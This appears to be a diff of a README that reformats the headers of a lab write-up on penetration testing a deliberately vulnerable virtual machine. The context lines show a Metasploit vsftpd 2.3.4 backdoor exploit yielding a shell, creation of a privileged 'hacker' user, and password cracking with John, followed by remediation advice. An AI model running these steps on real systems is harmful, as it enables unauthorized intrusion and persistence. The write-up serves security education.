@@ -1,9 +1,10 @@
 # 🛡️ Penetration Testing and Remediation on a Target System
 
-# 🎯 OBJECTIVES -
+## 🎯 OBJECTIVES -
 To conduct a structured penetration test using ethical hacking techniques on a deliberately vulnerable virtual machine. The objective is to simulate a real-world attack scenario and then provide recommendations for remediation.
 
-# 💻 LAB ENVIRONMENT -
+
+## 💻 LAB ENVIRONMENT -
 |Component         |  Details                             |
 |------------------|--------------------------------------|
 |Attacker Machine  |  Kali Linux (Latest Version)         |
@@ -11,8 +12,9 @@ To conduct a structured penetration test using ethical hacking techniques on a d
 |Network Type      |  Host-Only or NAT (VMware/VirtualBox)|
 |Target IP         |  192.168.56.101 (example)            |
 
-# 🚀 TASK PERFORMED –
-# 🔍 Task 1: Basic Network Scanning
+
+## 🚀 TASK PERFORMED –
+### 🔍 Task 1: Basic Network Scanning
 Purpose: Identify open and potentially vulnerable ports and services.
 
 Command:
@@ -32,7 +34,8 @@ FTP (21): Unauthenticated access or vulnerable versions.
 
 SSH (22): Brute-force potential.
 
-# 🕵️‍♀️ Task 2: Reconnaissance
+
+### 🕵️‍♀️ Task 2: Reconnaissance
 Purpose: To identify web-based vulnerabilities and sensitive files.
 
 Command:
@@ -45,15 +48,16 @@ Expected Output:
   
 + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
   
-# 🔐 Hidden Services Example:
+#### 🔐 Hidden Services Example:
 phpinfo.php: Often left during development.
 
 /test/ or /backup/ folders may contain credentials or outdated code.
 
-# 🛠️ Extra Tool:
+#### 🛠️ Extra Tool:
 dirb http://192.168.56.101
 
-# 📝 Task 3: Enumeration Summary
+
+### 📝 Task 3: Enumeration Summary
 Purpose: To gather detailed information about services, users, and shares.
 
 Command (Samba Enumeration):
@@ -68,7 +72,8 @@ Shares: IPC$, ADMIN$, Public, tmp
 
 Machine Name: METASPLOITABLE
 
-# 💥Task 4: Exploitation of Services
+
+### 💥Task 4: Exploitation of Services
 Exploit Example: vsftpd 2.3.4 Backdoor
 
 msfconsole
@@ -85,7 +90,8 @@ Backdoor service has been spawned.
 
 Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.101:6200)
 
-# 👤 Task 5: Creating A Privileged User
+
+### 👤 Task 5: Creating A Privileged User
 Command inside Shell:
 
 useradd -m hacker
@@ -98,7 +104,8 @@ Expected Output:
 
 uid=1001(hacker) gid=1001(hacker) groups=1001(hacker),27(sudo)
 
-# 🥷 Task 6: Cracking Password Hash
+
+### 🥷 Task 6: Cracking Password Hash
 Command:
 
 Crack Using John:
@@ -109,7 +116,8 @@ Expected Output:
 
 hacked123 (hacker)
 
-# 🔧 Task 7: Remediation And Recommendations
+
+### 🔧 Task 7: Remediation And Recommendations
 |Issue                              | Risk                      | Recommendation                         |
 |-----------------------------------|---------------------------|----------------------------------------|
 |vsftpd 2.3.4 with backdoor         | Remote shell access       | Disable FTP or update to latest version|
@@ -117,8 +125,10 @@ hacked123 (hacker)
 |Default users found via enum4linux | Easy brute-force          | Remove or rename default account       |
 |Weak password found                | Easy to crack             | Use strong, complex passwords          |
 
-# 📚 Conclusion
+
+## 📚 CONCLUSION -
 This project demonstrated a typical penetration testing workflow including scanning, enumeration, exploitation, and remediation planning. The vulnerabilities identified are common in many legacy or misconfigured systems and serve as practical learning examples for both aspiring ethical hackers and defenders.
 
-# ⚠️ Disclaimer
+
+## ⚠️ DISCLAIMER -
 This project is strictly for educational purposes. All activities were conducted in a closed virtual environment with no access to external or live systems.
